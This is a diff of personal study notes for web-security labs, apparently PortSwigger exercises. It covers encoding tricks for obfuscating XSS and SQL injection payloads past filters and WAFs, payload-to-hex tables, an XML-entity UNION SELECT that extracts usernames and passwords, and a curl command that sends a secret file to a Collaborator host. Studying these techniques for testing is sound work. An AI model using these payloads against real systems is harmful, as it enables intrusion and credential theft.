@@ -5440,9 +5440,86 @@ Prototype pollution is a JavaScript vulnerability that enables an attacker to ad
     `"input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"`
 
 ## Essential Skills
-Content for Essential Skills...
+**Obfuscating attacks using encodings**  
+- URL encoding ( % + 2 digit hex code)
+  [...]/?search=Fish+`%26`+Chips  ("Fish & Chips")
+- Double URL encoding
+  <img src=x onerror=alert(1)>
+  `[...]/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`
+  `[...]/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E`
+- HTML encoding (&#x + 2 digit hex code)
+  `<img src=x onerror="&#x61;lert(1)"`
+- Leading zeros (&# + 00s + hex code)
+  `<a href="javascript&#00000000000058;alert(1)">Click me</a>`
+- XML encoding
+  `<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>`
+- unicode escaping  (\u + 4 digit hex code)
+  `eval("\u0061lert(1)")`
+  `<a href="javascript:\u{00000000061}alert(1)">Click me</a>`
+- hex escapaing (\x + 2 digit hex code)
+  `eval("\x61lert")`
+  `0x53454c454354`  (prefix with 0x)
+- octal escaping
+  `eval("\141lert(1)")`
+- Obfuscation via multiple encodings
+  `<a href="javascript:&bsol;u0061lert(1)">Click me</a>`
+  `<a href="javascript:\u0061lert(1)">Click me</a>`
+  `<a href="javascript:alert(1)">Click me</a>`
+- SQL CHAR() function  (decimal or hex code matching to the chrs)
+  SELECT `CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)`
+
+| Character | Description          | URL Encoding (Hex) |
+|-----------|----------------------|--------------------|
+| ` `       | Space                | `%20` or `+`       |
+| `"`       | Double Quote         | `%22`              |
+| `%`       | Percent Sign         | `%25`              |
+| `&`       | Ampersand            | `%26`              |
+| `'`       | Single Quote         | `%27`              |
+| `(`       | Left Parenthesis     | `%28`              |
+| `)`       | Right Parenthesis    | `%29`              |
+| `+`       | Plus Sign            | `%2B`              |
+| `,`       | Comma                | `%2C`              |
+| `/`       | Forward Slash        | `%2F`              |
+| `:`       | Colon                | `%3A`              |
+| `;`       | Semicolon            | `%3B`              |
+| `<`       | Less Than            | `%3C`              |
+| `=`       | Equals Sign          | `%3D`              |
+| `>`       | Greater Than         | `%3E`              |
+| `?`       | Question Mark        | `%3F`              |
+| `@`       | At Sign              | `%40`              |
+| `[`       | Left Square Bracket  | `%5B`              |
+| `\`       | Backslash            | `%5C`              |
+| `]`       | Right Square Bracket | `%5D`              |
+| `^`       | Caret                | `%5E`              |
+| `_`       | Underscore           | `%5F`              |
+| `{`       | Left Curly Brace     | `%7B`              |
+| `|`       | Vertical Bar         | `%7C`              |
+| `}`       | Right Curly Brace    | `%7D`              |
+| `~`       | Tilde                | `%7E`              |
+
+| Payload                                      | Hexadecimal Encoding                                      |
+|----------------------------------------------|-----------------------------------------------------------|
+| `<script>alert(1)</script>`                  | `%3Cscript%3Ealert%281%29%3C%2Fscript%3E`                |
+| `javascript:alert(1)`                        | `javascript%3Aalert%281%29`                              |
+| `'; DROP TABLE users; --`                    | `%27%3B%20DROP%20TABLE%20users%3B%20--`                  |
+| `onerror="alert(1)"`                         | `onerror%3D%22alert%281%29%22`                           |
+| `<img src=x onerror=alert(1)>`              | `%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E`          |
+| `'><script>alert(1)</script>`                 | `%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E`         |
+| `<iframe src="javascript:alert(1)"></iframe>` | `%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E` |
+| `1' OR '1'='1`                               | `1%27%20OR%20%271%27%3D%271`                             |
+| `'; --`                                      | `%27%3B%20--`                                            |
+| `"><img src=x onerror=alert(1)>`            | `%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E`    |
+
+**Using Burp Scanner during manual testing**  
+- right click request > do active scan
+- scan selected insertion point
 
 ### Essential Skills Lab
+- SQL injection with filter bypass via **XML encoding**
+  - Bypass the WAF by obfuscating your payload using XML entities (Hackvertor extension）
+  `<storeId>1 UNION SELECT NULL</storeId>`
+  `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`
+- dd
 
 # Windows installation tools
 1. Burp Suite Pro
